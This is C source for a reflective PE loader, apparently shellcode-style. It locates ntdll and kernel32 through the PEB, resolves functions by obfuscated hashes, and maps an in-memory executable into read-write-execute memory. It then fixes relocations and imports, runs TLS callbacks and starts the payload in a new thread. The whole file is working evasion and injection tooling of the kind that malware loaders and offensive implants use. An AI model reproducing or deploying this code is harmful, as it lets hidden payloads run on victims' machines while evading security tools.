#include "utils.h"

#if !defined(_DEBUG)
#pragma comment(linker, "-SUBSYSTEM:CONSOLE")
#pragma comment(linker, "-entry:go")
#pragma comment(linker, "-nodefaultlib")
#endif

#define SEED 0x123456
#define ROR8(v) (v >> 8 | v << 24)

void native_reflective_execution(LPVOID data);

void go(LPVOID data)
{
    native_reflective_execution(data);
}

DWORD FunctionHash(PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = SEED;

    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
        Hash ^= PartialName + ROR8(Hash);
    }

    return Hash;
}

void get_api_addresses(PAPI_ADDRESSES api) {
    #ifdef _WIN64
    PPEB Peb = (PPEB)__readgsqword(0x60);
    #else
    PPEB Peb = (PPEB)__readfsdword(0x30);
    #endif
    PPEB_LDR_DATA Ldr = Peb->Ldr;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PIMAGE_EXPORT_DIRECTORY ExportDirectoryNtdll = NULL;
    PIMAGE_EXPORT_DIRECTORY ExportDirectoryKernel32 = NULL;
    PVOID DllBase = NULL;
    PVOID DllBaseNtdll = NULL;
    PVOID DllBaseKernel32 = NULL;

    PLDR_DATA_TABLE_ENTRY LdrEntry;
    for (LdrEntry = (PLDR_DATA_TABLE_ENTRY)(Ldr->InLoadOrderModuleList.Flink); LdrEntry->DllBase != NULL; LdrEntry = (PLDR_DATA_TABLE_ENTRY)(LdrEntry->InLoadOrderLinks.Flink))
    {
        DllBase = LdrEntry->DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (VirtualAddress == 0) continue;
        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
        PCHAR DllName = RVA2VA(PCHAR, DllBase, ExportDirectory->Name);

        switch (FunctionHash(DllName)) {
        case 0x87c8805c:
        {
            DllBaseNtdll = DllBase;
            ExportDirectoryNtdll = ExportDirectory;
            break;
        }
        case 0xa877a7f3:
        {
            DllBaseKernel32 = DllBase;
            ExportDirectoryKernel32 = ExportDirectory;
            break;
        }
        default: break;
        }

        if (DllBaseNtdll != NULL && DllBaseKernel32 != NULL) break;
        else continue;
    }

    //KERNEL32 API
    DWORD NumberOfNames = ExportDirectoryKernel32->NumberOfNames;
    PDWORD Functions = RVA2VA(PDWORD, DllBaseKernel32, ExportDirectoryKernel32->AddressOfFunctions);
    PDWORD Names = RVA2VA(PDWORD, DllBaseKernel32, ExportDirectoryKernel32->AddressOfNames);
    PWORD Ordinals = RVA2VA(PWORD, DllBaseKernel32, ExportDirectoryKernel32->AddressOfNameOrdinals);
    int api_count = 0;
    do
    {
        PCHAR FunctionName = RVA2VA(PCHAR, DllBaseKernel32, Names[NumberOfNames - 1]);
        auto hash = FunctionHash(FunctionName);
        switch (hash)
        {
        case 0x8422d3ca:
        {
            api->LoadLibraryA = RVA2VA(PVOID, DllBaseKernel32, Functions[Ordinals[NumberOfNames - 1]]);
            api_count += 1;
            break;
        }
        case 0x0f8cbd7f:
        {
            api->GetModuleHandleA = RVA2VA(PVOID, DllBaseKernel32, Functions[Ordinals[NumberOfNames - 1]]);
            api_count += 1;
            break;
        }
        case 0x08ac4a15:
        {
            api->CreateThread = RVA2VA(PVOID, DllBaseKernel32, Functions[Ordinals[NumberOfNames - 1]]);
            api_count += 1;
            break;
        }
        case 0x564f35a1:
        {
            api->GetProcAddress = RVA2VA(PVOID, DllBaseKernel32, Functions[Ordinals[NumberOfNames - 1]]);
            api_count += 1;
            break;
        }
        case 0xd3442311:
        {
            api->VirtualAlloc = RVA2VA(PVOID, DllBaseKernel32, Functions[Ordinals[NumberOfNames - 1]]);
            api_count += 1;
            break;
        }
        case 0x93da8a59:
        {
            api->VirtualFree = RVA2VA(PVOID, DllBaseKernel32, Functions[Ordinals[NumberOfNames - 1]]);
            api_count += 1;
            break;
        }
        default: break;
        }
        if (api_count == 6) break;
    } while (--NumberOfNames);

    //NTDLL API
    NumberOfNames = ExportDirectoryNtdll->NumberOfNames;
    Functions = RVA2VA(PDWORD, DllBaseNtdll, ExportDirectoryNtdll->AddressOfFunctions);
    Names = RVA2VA(PDWORD, DllBaseNtdll, ExportDirectoryNtdll->AddressOfNames);
    Ordinals = RVA2VA(PWORD, DllBaseNtdll, ExportDirectoryNtdll->AddressOfNameOrdinals);
    api_count = 0;
    do
    {
        PCHAR FunctionName = RVA2VA(PCHAR, DllBaseNtdll, Names[NumberOfNames - 1]);
        auto hash = FunctionHash(FunctionName);
        switch (hash)
        {
        case 0x14a75007:
        {
            api->RtlExitUserThread = RVA2VA(PVOID, DllBaseNtdll, Functions[Ordinals[NumberOfNames - 1]]);
            api_count += 1;
            break;
        }
        case 0xbcf78b4e:
        {
            api->memcpy_s = RVA2VA(PVOID, DllBaseNtdll, Functions[Ordinals[NumberOfNames - 1]]);
        }
        default: break;
        }
        if (api_count == 1) break;
    } while (--NumberOfNames); 
}

void native_reflective_execution(LPVOID data) {
    PIMAGE_DOS_HEADER           dos, doshost;
    PIMAGE_NT_HEADERS           nt, nthost;
    PIMAGE_SECTION_HEADER       sh;
    PIMAGE_THUNK_DATA           oft, ft;
    PIMAGE_IMPORT_BY_NAME       ibn;
    PIMAGE_IMPORT_DESCRIPTOR    imp;
    PIMAGE_DELAYLOAD_DESCRIPTOR del;
    PIMAGE_TLS_DIRECTORY        tls;
    PIMAGE_TLS_CALLBACK* callbacks;
    PIMAGE_RELOC                list;
    PIMAGE_BASE_RELOCATION      ibr;
    DWORD                       rva;
    PBYTE                       ofs;
    PCHAR                       name;
    HMODULE                     dll;
    Start_t                     Start;              // EXE
    LPVOID                      cs = NULL, base, host;
    DWORD                       i;
    HANDLE                      hThread;
    DWORD                       size_of_img;
    API_ADDRESSES               api;

    get_api_addresses(&api);

    base = data;
    dos = (PIMAGE_DOS_HEADER)base;
    nt = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);

    // before doing anything. check compatibility between exe/dll and host process.
    host = api.GetModuleHandleA(NULL);
    doshost = (PIMAGE_DOS_HEADER)host;
    nthost = RVA2VA(PIMAGE_NT_HEADERS, host, doshost->e_lfanew);

    if (nt->FileHeader.Machine != nthost->FileHeader.Machine) {
        api.RtlExitUserThread(0);
    }

    cs = api.VirtualAlloc(
        NULL, nt->OptionalHeader.SizeOfImage + 4096,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (cs == NULL) api.RtlExitUserThread(0);

    api.memcpy_s(cs, nt->OptionalHeader.SizeOfHeaders, base, nt->OptionalHeader.SizeOfHeaders);
    sh = IMAGE_FIRST_SECTION(nt);

    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        api.memcpy_s((PBYTE)cs + sh[i].VirtualAddress,
            sh[i].SizeOfRawData,
            (PBYTE)base + sh[i].PointerToRawData,
            sh[i].SizeOfRawData);
    }

    rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

    if (rva != 0) {
        ibr = RVA2VA(PIMAGE_BASE_RELOCATION, cs, rva);
        ofs = (PBYTE)cs - nt->OptionalHeader.ImageBase;

        while (ibr->VirtualAddress != 0) {
            list = (PIMAGE_RELOC)(ibr + 1);

            while ((PBYTE)list != (PBYTE)ibr + ibr->SizeOfBlock) {
                if (list->type == IMAGE_REL_TYPE) {
                    *(ULONG_PTR*)((PBYTE)cs + ibr->VirtualAddress + list->offset) += (ULONG_PTR)ofs;
                }
                else if (list->type != IMAGE_REL_BASED_ABSOLUTE) {
                    goto pe_cleanup;
                }
                list++;
            }
            ibr = (PIMAGE_BASE_RELOCATION)list;
        }
    }

    rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

    if (rva != 0) {
        imp = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, cs, rva);
        // For each DLL
        for (; imp->Name != 0; imp++) {
            name = RVA2VA(PCHAR, cs, imp->Name);
            dll = api.LoadLibraryA(name);
            // Resolve the API for this library
            oft = RVA2VA(PIMAGE_THUNK_DATA, cs, imp->OriginalFirstThunk);
            ft = RVA2VA(PIMAGE_THUNK_DATA, cs, imp->FirstThunk);

            // For each API
            for (;; oft++, ft++) {
                // No API left?
                if (oft->u1.AddressOfData == 0) break;

                // Resolve by ordinal?
                if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) {
                    ft->u1.Function = (ULONG_PTR)api.GetProcAddress(dll, (LPCSTR)IMAGE_ORDINAL(oft->u1.Ordinal));
                }
                else {
                    // Resolve by name
                    ibn = RVA2VA(PIMAGE_IMPORT_BY_NAME, cs, oft->u1.AddressOfData);
                    ft->u1.Function = (ULONG_PTR)api.GetProcAddress(dll, ibn->Name);
                }
            }
        }
    }

    rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress;

    if (rva != 0) {
        del = RVA2VA(PIMAGE_DELAYLOAD_DESCRIPTOR, cs, rva);

        // For each DLL
        for (; del->DllNameRVA != 0; del++) {
            name = RVA2VA(PCHAR, cs, del->DllNameRVA);

            dll = api.LoadLibraryA(name);

            if (dll == NULL) continue;

            // Resolve the API for this library
            oft = RVA2VA(PIMAGE_THUNK_DATA, cs, del->ImportNameTableRVA);
            ft = RVA2VA(PIMAGE_THUNK_DATA, cs, del->ImportAddressTableRVA);

            // For each API
            for (;; oft++, ft++) {
                // No API left?
                if (oft->u1.AddressOfData == 0) break;

                // Resolve by ordinal?
                if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) {
                    ft->u1.Function = (ULONG_PTR)api.GetProcAddress(dll, (LPCSTR)IMAGE_ORDINAL(oft->u1.Ordinal));
                }
                else {
                    // Resolve by name
                    ibn = RVA2VA(PIMAGE_IMPORT_BY_NAME, cs, oft->u1.AddressOfData);
                    ft->u1.Function = (ULONG_PTR)api.GetProcAddress(dll, ibn->Name);
                }
            }
        }
    }

    /**
      Execute TLS callbacks. These are only called when the process starts, not when a thread begins, ends
      or when the process ends. TLS is not fully supported.
    */
    rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (rva != 0) {
        tls = RVA2VA(PIMAGE_TLS_DIRECTORY, cs, rva);
        // address of callbacks is absolute. requires relocation information
        callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
        if (callbacks) {
            while (*callbacks != NULL) {
                // call function
                (*callbacks)((LPVOID)cs, DLL_PROCESS_ATTACH, NULL);
                callbacks++;
            }
        }
    }

    size_of_img = nt->OptionalHeader.SizeOfImage;
    Start = RVA2VA(Start_t, cs, nt->OptionalHeader.AddressOfEntryPoint);

    hThread = api.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Start, NULL, 0, NULL);

    if (hThread != NULL) {
        api.RtlExitUserThread(0);
    }
pe_cleanup:
    // if memory allocated
    if (cs != NULL) {
        // release
        api.VirtualFree(cs, 0, MEM_DECOMMIT | MEM_RELEASE);
        api.RtlExitUserThread(0);
    }
}

#if defined(_DEBUG)
int main(int argc, char* argv[])
{
    native_reflective_execution(NULL);
    return 0;
}
#endif